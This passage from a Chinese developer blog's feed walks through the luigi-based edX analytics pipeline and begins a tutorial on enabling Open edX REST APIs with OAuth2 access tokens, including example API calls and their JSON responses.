        &lt;span class="n"&gt;log&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;debug&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;override.cfg does not exist&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="c1"&gt;# Tell luigi what dependencies to pass to the Hadoop nodes&lt;/span&gt;
    &lt;span class="c1"&gt;# - boto is used for all direct interactions with s3.&lt;/span&gt;
    &lt;span class="c1"&gt;# - cjson is used for all parsing event logs.&lt;/span&gt;
    &lt;span class="c1"&gt;# - filechunkio is used for multipart uploads of large files to s3.&lt;/span&gt;
    &lt;span class="c1"&gt;# - opaque_keys is used to interpret serialized course_ids&lt;/span&gt;
    &lt;span class="c1"&gt;#   - dependencies of opaque_keys:  bson, stevedore&lt;/span&gt;
    &lt;span class="n"&gt;luigi&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hadoop&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;attach&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;boto&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;cjson&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;filechunkio&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;opaque_keys&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;bson&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;stevedore&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ciso8601&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="c1"&gt;# TODO: setup logging for tasks or configured logging mechanism&lt;/span&gt;

    &lt;span class="c1"&gt;# Launch Luigi using the default builder&lt;/span&gt;

    &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="n"&gt;profile_if_necessary&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getenv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;WORKFLOW_PROFILER&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getenv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;WORKFLOW_PROFILER_PATH&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;
        &lt;span class="n"&gt;luigi&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;啊哈，从中我们发现&lt;code&gt;launch-task&lt;/code&gt;无非是对&lt;a href="https://github.com/spotify/luigi"&gt;luigi&lt;/a&gt;的封装，主要加入了日志记录和配置文件。&lt;/p&gt;
&lt;p&gt;之后我们会发现，对&lt;a href="https://github.com/spotify/luigi"&gt;luigi&lt;/a&gt;的熟悉程度根本上决定了我们能做的定制深度。&lt;/p&gt;
&lt;p&gt;而业务逻辑，便是写在luigi的task类中run函数里（多数时候是 JobTask 里的mapper和reducer函数）&lt;/p&gt;
&lt;p&gt;这个过程颇像rpg，一边前进一边获得新的线索，而每条新的线索又构成你前进的路标。&lt;/p&gt;
&lt;p&gt;希望你最后能从锁妖塔救出灵儿 ：）&lt;/p&gt;
&lt;p&gt;好啦游戏现在有了支线剧情，我们要了解下&lt;a href="https://github.com/spotify/luigi"&gt;luigi&lt;/a&gt;是什么鬼。&lt;/p&gt;
&lt;p&gt;在我了解了&lt;a href="https://github.com/spotify/luigi"&gt;luigi&lt;/a&gt;是什么鬼后，战斗力简直+1000（此处应该有动态闪光效果），在不熟悉luigi之前，launch-task的许多怪癖我根本无从理解，好比任务的幂等性，他喵的，我在这个问题上纳闷了许久，对着不能理解的任务产出无从下手。&lt;/p&gt;
&lt;h2&gt;&lt;a href="https://github.com/spotify/luigi"&gt;luigi&lt;/a&gt;&lt;/h2&gt;
&lt;h3&gt;什么鬼&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Luigi is a Python module that helps you build complex pipelines of batch jobs. It handles dependency resolution, workflow management, visualization etc. It also comes with Hadoop support built in.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;luigi的目的是解决所有管道问题，通常与长时间运行的批处理任务相关。像Hadoop作业啦，dumping数据到数据库啦，运行机器学习算法啦，数据分析啦之类的&lt;/p&gt;
&lt;p&gt;edx-analytics-pipeline将luigi用于数据分析。当数据量很大，任务复杂的时候，luigi就显示出优越性了。luigi的几个特性此时很有帮助，诸如处理task依赖问题，保证所有关于文件系统的操作的原子性，后者意味着流程不会因为包含不完整数据而导致运行时崩溃。&lt;/p&gt;
&lt;p&gt;它还带有web界面，可以看出任务的执行状态，和依赖关系&lt;/p&gt;
&lt;h3&gt;Quick Start&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;luigi&lt;/span&gt;

&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;MyTask&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;luigi&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Task&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;luigi&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;IntParameter&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;y&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;luigi&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;IntParameter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;default&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;45&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;run&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;y&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;luigi&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;code&gt;python my_task.py MyTask --local-scheduler --x 123 --y 456&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;核心概念&lt;/h3&gt;
&lt;p&gt;luigi有三个核心概念：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Task:抽象类，任务逻辑运行的地方，提供了一些方法来定义任务的逻辑行为。主要有run, output, requires&lt;/li&gt;
&lt;li&gt;Target:抽象类，我把它理解为类文件句柄。一般对应为磁盘上的文件，HDFS上文件或数据库等.一般开箱可用的LocalTarget和hdfs.HdfsTarget就够用了，很少需要自己写&lt;/li&gt;
&lt;li&gt;Parameter：用于控制job的运行&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;下边这幅图很好地说明了三者的关系
&lt;img alt="luigi_concept" src="img/edx/analysis/luigi_concept.jpeg" /&gt;&lt;/p&gt;
&lt;h3&gt;注意事项&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;luigi需要依赖于外部的调度器来触发工作流，如crontab等&lt;/li&gt;
&lt;li&gt;配置：当前工作目录下的client.cfg优先级高于 /etc/luigi &lt;/li&gt;
&lt;li&gt;luigi任务的输出都将被无限期地保存。这点的好处就是当后面的任务失败时，在重跑失败任务时可以重用前面任务的输出，而不需要重跑前面的任务。不好的地方在于，将会有大量的中间结果保存在系统上，一个比较有用的建议就是把这些输出保存在一个特定的目录中，并进行定期地清除。&lt;ul&gt;
&lt;li&gt;一个常见的用例是每晚要运行一个Hadoop任务，但有时因为各种原因该任务会失败。一个有用的模式就是在最后建立一个虚拟任务，仅需声明依赖于最近一天实际真正的任务。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;更多细节&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://luigi.readthedocs.org/en/stable/workflows.html"&gt;文档&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://vincentzhwg.iteye.com/blog/2063388"&gt;Luigi--基于Python语言的流式任务调度框架教程&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;AnswerDistributionToMySQLTaskWorkflow&lt;/h2&gt;
&lt;p&gt;UML类图如下（使用Understand分析的结果）&lt;/p&gt;
&lt;p&gt;&lt;img alt="edx_pipeline_uml" src="img/edx/analysis/edx_pipeline_uml.jpeg" /&gt;&lt;/p&gt;
&lt;p&gt;顺着UML类图走一遍，容易发现AnswerDistributionToMySQLTaskWorkflow从父类中继承的多是一些我们不关心的特性。&lt;/p&gt;
&lt;p&gt;我们的兴趣在于统计答案分布的的task，业务代码是那里实现的呢？找到业务逻辑的实现的话，我们就能够自己定制了&lt;/p&gt;
&lt;p&gt;容易发现AnswerDistributionToMySQLTaskWorkflow类中的唯一方法&lt;code&gt;insert_source_task&lt;/code&gt;中的&lt;code&gt;AnswerDistributionPerCourse&lt;/code&gt;便是关键&lt;/p&gt;
&lt;p&gt;&lt;code&gt;insert_source_task&lt;/code&gt;的doc string写的很清楚了&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Write to answer_distribution table from AnswerDistributionTSVTask.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;AnswerDistributionPerCourse 便是产生 answer_distribution的地方。&lt;/p&gt;
&lt;p&gt;我们接着去看下的AnswerDistributionPerCourse UML类图&lt;/p&gt;
&lt;p&gt;&lt;img alt="edx_pipeline_uml" src="img/edx/analysis/edx_pipeline_uml2.jpeg" /&gt;&lt;/p&gt;
&lt;p&gt;根据我们先前学习luigi的知识，知道继承JobTask的类往往会自己实现业务逻辑，关键方法就是&lt;code&gt;mapper&lt;/code&gt;和&lt;code&gt;reducer&lt;/code&gt;，通过观察UML类图发现，具体的实现被移到AnswerDistributionPerCourseMixin中，至于为何这样做，如果你熟悉Python的话，会发现使用Mixin来实现多态是Python社区的惯用做法&lt;/p&gt;
&lt;p&gt;至此，我们已经知道怎么编写自己定制的业务逻辑了，重写一个Mixin类去实现业务逻辑就好了呀！&lt;/p&gt;
&lt;h2&gt;options&lt;/h2&gt;
&lt;p&gt;最后扫尾一下，关于在文档不足的情况下，如何了解函数的用法，好比，我们怎么知道&lt;code&gt;launch-task AnswerDistributionToMySQLTaskWorkflow [options]&lt;/code&gt;中的&lt;code&gt;[options]&lt;/code&gt;有哪些可用的选项。看测试用例呀&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;test_answer_distribution_mysql&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;task&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;launch&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;
            &lt;span class="s1"&gt;&amp;#39;AnswerDistributionToMySQLTaskWorkflow&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="s1"&gt;&amp;#39;--src&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;test_src&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="s1"&gt;&amp;#39;--dest&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;url_path_join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;test_root&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;dst&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
            &lt;span class="s1"&gt;&amp;#39;--name&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;test&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="s1"&gt;&amp;#39;--include&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;quot;*&amp;quot;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="s1"&gt;&amp;#39;--manifest&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;url_path_join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;test_root&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;manifest.txt&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
            &lt;span class="s1"&gt;&amp;#39;--base-input-format&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;INPUT_FORMAT&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="s1"&gt;&amp;#39;--lib-jar&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;oddjob_jar&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="s1"&gt;&amp;#39;--n-reduce-tasks&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;NUM_REDUCERS&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
            &lt;span class="s1"&gt;&amp;#39;--credentials&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;export_db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;credentials_file_url&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="p"&gt;])&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;就酱吧&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 30 Jun 2015 00:00:00 +0000</pubDate><guid>tag:,2015-06-30:edx-analytics-pipeline-code-analysis.html</guid><category>edx</category></item><item><title>enable Open edX REST APIs(work with mobile)</title><link>/edx-api.html</link><description>&lt;p&gt;当时处理这部分的动机是将edx与微信对接&lt;/p&gt;
&lt;p&gt;如果你在处理与edx API相关的工作，这篇文章可能对你也有帮助。好比你在编译edx移动端（android和iOS）, 这部分工作应该也是最主要的工作之一&lt;/p&gt;
&lt;h2&gt;思路&lt;/h2&gt;
&lt;p&gt;我们首先简要做一下任务陈述：允许edx用户通过微信公众平台访问edX，登录以及请求相关的数据&lt;/p&gt;
&lt;p&gt;这里假设读者们已经基本了解了&lt;a href="https://tools.ietf.org/html/draft-ietf-oauth-v2-31"&gt;OAuth2&lt;/a&gt;,包括它的一些基本概念和通信流程，如果还不了解，请先阅读OAuth2相关的材料。&lt;/p&gt;
&lt;p&gt;在我们的任务中，我们先识别出OAuth中的参与实体，RO(resource owner)，RS (resource server)和Client，至于AS(authorization server)在edx中和RS可以认为一体。&lt;/p&gt;
&lt;p&gt;很显然我们的任务中，edx平台作为RS，而edx user是RO，而我们自己写的微信公众号后台便是Client。&lt;/p&gt;
&lt;p&gt;由于微信后端和平台拥有者是相同的，所以我就不采用redirect的方式了。而假设Client是受信任的。&lt;/p&gt;
&lt;p&gt;那么通信的流程是这样的，edx user在微信给微信公众号中给Client发送账号和密码，而后Client携带用户账号和密码去换取授权令牌(Access Token)，且存下授权令牌，如此一来，概念上，用户在微信中便已经保持登录edX的状态了。&lt;/p&gt;
&lt;p&gt;而后Client根据用户请求，携带Access Token去服务器请求资源返回给微信用户。&lt;/p&gt;
&lt;p&gt;这里不应当混淆的是，&lt;code&gt;使用微信账户登录edx&lt;/code&gt;，和&lt;code&gt;在微信中以edx user身份访问edx&lt;/code&gt;，是两个完全不同的过程，&lt;code&gt;使用微信账户登录edx&lt;/code&gt;本质上是个第三方社交账号登录edx的问题，RS是微信，而edx user在微信中访问edx，RS是edX。&lt;/p&gt;
&lt;p&gt;好了，思路基本清晰了。&lt;/p&gt;
&lt;h2&gt;先前的经验&lt;/h2&gt;
&lt;p&gt;之前写过一篇博客：&lt;a href="http://wwj718.github.io/edx-mobile-api.html"&gt;让edx为手机端提供接口&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;本打算按照之前的经验，却发现，采用TokenAuthentication的解决方案除了侵入性太强，不够优雅之外，安全性也得不到保证&lt;/p&gt;
&lt;p&gt;&lt;a href="http://edx.readthedocs.org/projects/edx-platform-api/en/latest/authentication.html?highlight=secure"&gt;EdX API Authentication&lt;/a&gt;中有一句话，&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;OAuth 2.0 is an open standard used by many systems that require secure user authentication&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我开始以为，secure只是个建议，稍后我们会发现，这是个强制要求。&lt;/p&gt;
&lt;p&gt;无论是OAuth2Authentication, SessionAuthentication还是TokenAuthentication，本质都是个认证问题，而认证过程在django中间件里实现，对关注业务逻辑的开发者而言是透明的，而edx的api使用的统一是OAuth2Authentication和SessionAuthentication。&lt;/p&gt;
&lt;p&gt;可选的路线只有一条，开始折腾OAuth2.&lt;/p&gt;
&lt;h2&gt;目标定位&lt;/h2&gt;
&lt;p&gt;经过一番跟踪和分析，我们发现了&lt;a href="https://github.com/edx/edx-oauth2-provider"&gt;edx/edx-oauth2-provider&lt;/a&gt;和&lt;a href="https://github.com/edx/django-oauth2-provider"&gt;django-oauth2-provider&lt;/a&gt;与OAuth关系最大&lt;/p&gt;
&lt;p&gt;而他们的关系是&lt;a href="https://github.com/edx/edx-oauth2-provider"&gt;edx/edx-oauth2-provider&lt;/a&gt;依赖于&lt;a href="https://github.com/edx/django-oauth2-provider"&gt;edx/django-oauth2-provider&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;而&lt;a href="https://github.com/edx/django-oauth2-provider"&gt;edx/django-oauth2-provider&lt;/a&gt;fork自&lt;a href="https://github.com/caffeinehit/django-oauth2-provider"&gt;caffeinehit/django-oauth2-provider&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="https://github.com/caffeinehit/django-oauth2-provider"&gt;caffeinehit/django-oauth2-provider&lt;/a&gt;的&lt;a href="https://django-oauth2-provider.readthedocs.org/en/latest/"&gt;文档&lt;/a&gt;对我们很有助益，&lt;/p&gt;
&lt;h2&gt;实验&lt;/h2&gt;
&lt;p&gt;定位到这两个关键库，其实接下来的工作就轻松多了。&lt;br /&gt;
首先做些试探性的实验。&lt;br /&gt;
先去&lt;code&gt;/edx/app/edxapp/lms.env.json&lt;/code&gt;，在FEATURES里加上&lt;code&gt;"ENABLE_OAUTH2_PROVIDER": true,&lt;/code&gt;以及&lt;code&gt;"ENABLE_MOBILE_REST_API":true,&lt;/code&gt;,而后去admin里获取一个受信任的Client和Access Token，对应的地址分别是是&lt;code&gt;/admin/oauth2_provider/trustedclient/&lt;/code&gt;和&lt;code&gt;/admin/oauth2/accesstoken/add/&lt;/code&gt;,过期时间（Expires）可以设得远些，使其不易生效，你也通过设置&lt;code&gt;OAUTH_ID_TOKEN_EXPIRATION&lt;/code&gt;来控制失效时间，这个数值衡量的是用户两次登录的时间间隔，好比你要求用户每七天需要登录一次。&lt;/p&gt;
&lt;p&gt;那么激动人心的时刻来啦,我们开始请求接口&lt;/p&gt;
&lt;p&gt;&lt;code&gt;curl -k -H "Authorization: Bearer Your_Access_Token” http://example.com/api/user/v1/accounts/wwj&lt;/code&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;{&amp;quot;username&amp;quot;: &amp;quot;wwj&amp;quot;, &amp;quot;bio&amp;quot;: null, &amp;quot;requires_parental_consent&amp;quot;: true, &amp;quot;name&amp;quot;: &amp;quot;wwj&amp;quot;, &amp;quot;country&amp;quot;: null, &amp;quot;is_active&amp;quot;: true, &amp;quot;profile_image&amp;quot;: {&amp;quot;image_url_full&amp;quot;: &amp;quot;http://example.com/static/images/default-theme/default-profile_500.de2c6854f1eb.png&amp;quot;, &amp;quot;image_url_large&amp;quot;: &amp;quot;http://example.com/static/images/default-theme/default-profile_120.33ad4f755071.png&amp;quot;, &amp;quot;image_url_medium&amp;quot;: &amp;quot;http://example.com/static/images/default-theme/default-profile_50.5fb006f96a15.png&amp;quot;, &amp;quot;image_url_small&amp;quot;: &amp;quot;http://example.com/static/images/default-theme/default-profile_30.ae6a9ca9b390.png&amp;quot;, &amp;quot;has_image&amp;quot;: false}, &amp;quot;year_of_birth&amp;quot;: null, &amp;quot;level_of_education&amp;quot;: null, &amp;quot;goals&amp;quot;: null, &amp;quot;language_proficiencies&amp;quot;: [], &amp;quot;gender&amp;quot;: null, &amp;quot;mailing_address&amp;quot;: null, &amp;quot;email&amp;quot;: &amp;quot;wwj@example.com&amp;quot;, &amp;quot;date_joined&amp;quot;: &amp;quot;2015-05-13T09:42:45Z&amp;quot;}
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;如果你使用&lt;a href="https://github.com/jakubroztocil/httpie"&gt;httpie&lt;/a&gt;(推荐)，那么返回的内容将以更易于阅读的形式(缩进高亮)，返回给你.之后我们都只要httpie&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http http://example.com/api/user/v1/accounts/wwj   "Authorization: Bearer 1a17079824f66bfa5116bd8780b5a119e603a79c"&lt;/code&gt; (实际上是header参数)&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;{
    &amp;quot;bio&amp;quot;: null,
    &amp;quot;country&amp;quot;: null,
    &amp;quot;date_joined&amp;quot;: &amp;quot;2015-05-13T09:42:45Z&amp;quot;,
    &amp;quot;email&amp;quot;: &amp;quot;wwj@qq.com&amp;quot;,
    &amp;quot;gender&amp;quot;: null,
    &amp;quot;goals&amp;quot;: null,
    &amp;quot;is_active&amp;quot;: true,
    &amp;quot;language_proficiencies&amp;quot;: [],
    &amp;quot;level_of_education&amp;quot;: null,
    &amp;quot;mailing_address&amp;quot;: null,
    &amp;quot;name&amp;quot;: &amp;quot;wwj&amp;quot;,
    &amp;quot;profile_image&amp;quot;: {
        &amp;quot;has_image&amp;quot;: false,
        &amp;quot;image_url_full&amp;quot;: &amp;quot;http://example.com/static/images/default-theme/default-profile_500.de2c6854f1eb.png&amp;quot;,
        &amp;quot;image_url_large&amp;quot;: &amp;quot;http://example.com/static/images/default-theme/default-profile_120.33ad4f755071.png&amp;quot;,
        &amp;quot;image_url_medium&amp;quot;: &amp;quot;http://example.com/static/images/default-theme/default-profile_50.5fb006f96a15.png&amp;quot;,
        &amp;quot;image_url_small&amp;quot;: &amp;quot;http://example.com/static/images/default-theme/default-profile_30.ae6a9ca9b390.png&amp;quot;
    },
    &amp;quot;requires_parental_consent&amp;quot;: true,
    &amp;quot;username&amp;quot;: &amp;quot;wwj&amp;quot;,
    &amp;quot;year_of_birth&amp;quot;: null
}
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;再演示一个使用requests的做法&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;
&lt;span class="n"&gt;headers&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Authorization&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;bearer 1a17079824f66bfa5116bd8780b5a119e603a79c&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;User-Agent&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;ChangeMeClient/0.1 by YourUsername&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="n"&gt;response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://127.0.0.1/api/user/v1/accounts/wwj&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;json&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;得到&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;{u&amp;#39;bio&amp;#39;: None,
 u&amp;#39;country&amp;#39;: None,
 u&amp;#39;date_joined&amp;#39;: u&amp;#39;2015-05-13T09:42:45Z&amp;#39;,
 u&amp;#39;email&amp;#39;: u&amp;#39;wwj@qq.com&amp;#39;,
 u&amp;#39;gender&amp;#39;: None,
 u&amp;#39;goals&amp;#39;: None,
 u&amp;#39;is_active&amp;#39;: True,
 u&amp;#39;language_proficiencies&amp;#39;: [],
 u&amp;#39;level_of_education&amp;#39;: None,
 u&amp;#39;mailing_address&amp;#39;: None,
 u&amp;#39;name&amp;#39;: u&amp;#39;wwj&amp;#39;,
 u&amp;#39;profile_image&amp;#39;: {u&amp;#39;has_image&amp;#39;: False,
  u&amp;#39;image_url_full&amp;#39;: u&amp;#39;http://127.0.0.1/static/images/default-theme/default-profile_500.de2c6854f1eb.png&amp;#39;,
  u&amp;#39;image_url_large&amp;#39;: u&amp;#39;http://127.0.0.1/static/images/default-theme/default-profile_120.33ad4f755071.png&amp;#39;,
  u&amp;#39;image_url_medium&amp;#39;: u&amp;#39;http://127.0.0.1/static/images/default-theme/default-profile_50.5fb006f96a15.png&amp;#39;,
  u&amp;#39;image_url_small&amp;#39;: u&amp;#39;http://127.0.0.1/static/images/default-theme/default-profile_30.ae6a9ca9b390.png&amp;#39;},
 u&amp;#39;requires_parental_consent&amp;#39;: True,
 u&amp;#39;username&amp;#39;: u&amp;#39;wwj&amp;#39;,
